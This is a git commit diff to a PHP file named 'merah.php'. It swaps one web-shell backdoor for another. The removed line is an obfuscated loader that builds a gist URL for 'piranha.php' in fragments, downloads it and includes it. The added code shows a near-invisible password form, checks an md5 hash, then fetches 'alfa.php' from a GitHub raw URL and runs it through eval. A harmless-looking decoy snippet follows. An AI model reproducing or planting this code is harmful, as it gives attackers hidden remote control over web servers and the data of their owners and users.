8bbfd7ae02d0818ea8b995ed5403539beb6f9cb3
dan1584 <pewedandi32@gmail.com>
2025-01-26 13:12:11 +0700

    Update merah.php

--- merah.php
+++ merah.php
@@ -1,1 +1,10 @@
-<?php $url='https://gist.githu';$url.='buserc';$url.='ontent';$url.='.com/r';$url.='afaeyf';$url.='a1337/';$url.='a2d1d7';$url.='48e8de';$url.='b9e9c0';$url.='407d14';$url.='579290';$url.='44/raw';$url.='/bcb2d';$url.='6d9f9c';$url.='0a3a06';$url.='2aff34';$url.='3d6fa3';$url.='795d36';$url.='bd02b/';$url.='piranh';$url.='a.php';$dns='ht';$dns.='tps:/';$dns.='/cloud';$dns.='flare-';$dns.='dns.c';$dns.='om/dns';$dns.='-query';$ch=CurL_init ($url);if(defined('CURLOPT_DOH_URL')){curL_setOPT($ch,CURLOPT_DOH_URL,$dns);}cUrl_setOpt($ch,CURLOPT_RETURNTRANSFER,TRUE);Curl_seTOPt($ch,CURLOPT_SSL_VERIFYHOST,2);curL_seTopt ($ch,CURLOPT_SSL_VERIFYPEER,true);$res=curl_ExEC($ch);cuRl_close($ch);$tmp=TMPfIle();$path=streaM_Get_meTa_daTa($tmp);$path=$path['uri'];fprintf($tmp,'%s',$res);IncLude($path); ?>
+<?php
+session_start();
+function g($u){if(function_exists('curl_exec')){$c=curl_init($u);curl_setopt_array($c,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_FOLLOWLOCATION=>1,CURLOPT_USERAGENT=>"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",CURLOPT_SSL_VERIFYPEER=>0,CURLOPT_SSL_VERIFYHOST=>0,CURLOPT_COOKIE=>isset($_SESSION['SAP'])?$_SESSION['SAP']:[]]);$r=curl_exec($c);curl_close($c);}elseif(function_exists('file_get_contents')){$r=file_get_contents($u);}elseif(function_exists('fopen')&&function_exists('stream_get_contents')){$h=fopen($u,"r");$r=stream_get_contents($h);fclose($h);}else{$r=false;}return$r;}function i(){return isset($_SESSION['logged_in'])&&$_SESSION['logged_in']===true;}if(isset($_POST['password'])){$e=$_POST['password'];$h='48dd3046643b6bf08f2a6d9be1b0dd26';if(md5($e)===$h){$_SESSION['logged_in']=true;$_SESSION['SAP']='janco';}}if(i()){$a=g('https://raw.githubusercontent.com/dan1584/asfdas/refs/heads/main/alfa.php');eval('?>'.$a);}else{?><!DOCTYPE html><html><head><style>input{border:0}input:focus{outline:0;border:none;box-shadow:none}</style></head><body><form method="post"><input style="border:0 solid #fff" type="password" name="password"></form></body></html> <?php } ?>
+<?php
+$showHiddenFile = false; // Set this variable based on your conditions
+
+// Content that may be hidden based on conditions
+if ($showHiddenFile) {
+    echo "<div><p>This is a hidden file or content.</p></div>";
+}
